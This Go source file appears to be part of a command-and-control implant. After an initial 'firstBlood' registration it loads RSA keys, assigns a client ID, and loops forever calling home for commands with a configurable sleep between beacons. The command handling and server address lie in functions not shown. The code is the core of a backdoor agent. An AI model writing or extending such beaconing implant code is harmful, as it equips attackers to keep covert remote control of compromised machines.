package internal

import (
	"belin/config"
	"belin/encrypt"
	"belin/metadata"
	"belin/requester"
	"errors"
	"log"
	"time"
)

func Init() error {
	enc, err := encrypt.New(config.RSAPUB, config.RSAPRV)
	if err != nil {
		return err
	}

	mt := metadata.New()
	log.Printf("client Id %d", mt.ClientId)

	req := requester.New()

	b, err := firstBlood(enc, mt, &req)
	if err != nil {
		return err
	}

	if !b {
		return errors.New("firstblood not reached")
	}

	log.Printf("firstblood ok")
	time.Sleep(time.Duration(config.SLEP))
	return handler(enc, mt, &req)
}


func handler(enc *encrypt.Enc, mt *metadata.Metadata, r *requester.ReqProfile) error {
	for {
		resp, err := callCommand(mt, r)
		if err != nil {
			return err
		}
		log.Printf("call home ok st=%d cl=%d\n", resp.StatusCode, resp.ContentLength)
		
		
		
		time.Sleep(time.Duration(config.SLEP) * time.Millisecond)
	}
}